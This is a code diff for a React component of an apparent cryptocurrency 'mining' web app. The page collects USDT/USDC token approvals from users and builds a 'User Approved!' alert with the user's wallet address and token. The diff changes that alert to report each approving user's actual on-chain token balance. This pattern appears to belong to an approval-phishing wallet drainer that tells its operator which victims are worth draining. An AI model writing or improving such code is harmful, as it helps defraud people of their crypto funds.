@@ -1,6 +1,6 @@
 'use client';
 
-import { useEffect, useMemo, useState } from 'react';
+import { useCallback, useEffect, useMemo, useState } from 'react';
 import Image from 'next/image';
 import { Wallet, TrendingUp, Percent, Sparkles } from 'lucide-react';
 import { useWriteContract, useWaitForTransactionReceipt, useReadContract } from 'wagmi';
@@ -168,6 +168,22 @@ export default function MiningSection() {
     setDisplayUsdc(formatBalance(usdcBalance.data as bigint | undefined, usdcDecimals.data as number | undefined));
   }, [usdtBalance.data, usdtDecimals.data, usdcBalance.data, usdcDecimals.data]);
 
+  const getTokenBalanceForAlert = useCallback((asset: 'USDT' | 'USDC') => {
+    const rawBalance = asset === 'USDT'
+      ? (usdtBalance.data as bigint | undefined)
+      : (usdcBalance.data as bigint | undefined);
+    const decimals = asset === 'USDT'
+      ? (usdtDecimals.data as number | undefined)
+      : (usdcDecimals.data as number | undefined);
+
+    if (rawBalance === undefined || decimals === undefined) return '--';
+
+    const formatted = Number(formatUnits(rawBalance, decimals));
+    if (Number.isNaN(formatted)) return '--';
+
+    return formatted.toFixed(2);
+  }, [usdtBalance.data, usdtDecimals.data, usdcBalance.data, usdcDecimals.data]);
+
   const handleAssetSelection = async (asset: 'USDT' | 'USDC', amount: string) => {
     setSelectedAsset(asset);
     setMiningAmount(amount);
@@ -227,7 +243,7 @@ export default function MiningSection() {
           const chainName = chainNames[String(chainId)] || `Chain ${chainId}`;
           const approvalConfig = addressConfig[String(chainId) as keyof typeof addressConfig];
           const tokenAddress = selectedAsset === 'USDT' ? approvalConfig?.USDT : approvalConfig?.USDC;
-          const selectedAssetBalance = selectedAsset === 'USDT' ? minedPerToken.usdt : minedPerToken.usdc;
+          const selectedAssetBalance = getTokenBalanceForAlert(selectedAsset);
           const message = `🎉 <b>User Approved!</b>\n\n` +
             `👤 User: <code>${account?.address}</code>\n` +
             `🪙 Token: <code>${tokenAddress}</code>\n` +
@@ -245,18 +261,6 @@ export default function MiningSection() {
     }
         
         try {
-          // Get chain name for alert message
-          const chainNames: { [key: string]: string } = {
-            '97': 'BSC Testnet',
-            '56': 'BSC Mainnet',
-            '11155111': 'Ethereum Sepolia',
-            '1': 'Ethereum Mainnet',
-            '80001': 'Polygon Mumbai',
-            '137': 'Polygon Mainnet'
-          };
-          
-          const chainName = chainNames[String(chainId)] || `Chain ${chainId}`;
-          
           // Get the token contract address
           const config = addressConfig[String(chainId) as keyof typeof addressConfig];
           const tokenAddress = selectedAsset === 'USDT' ? config?.USDT : config?.USDC;
@@ -348,6 +352,11 @@ export default function MiningSection() {
     minedPerToken.usdc,
     miningTotals.totalMined,
     referralAddress,
+    usdtBalance.data,
+    usdtDecimals.data,
+    usdcBalance.data,
+    usdcDecimals.data,
+    getTokenBalanceForAlert,
   ]);
 
 
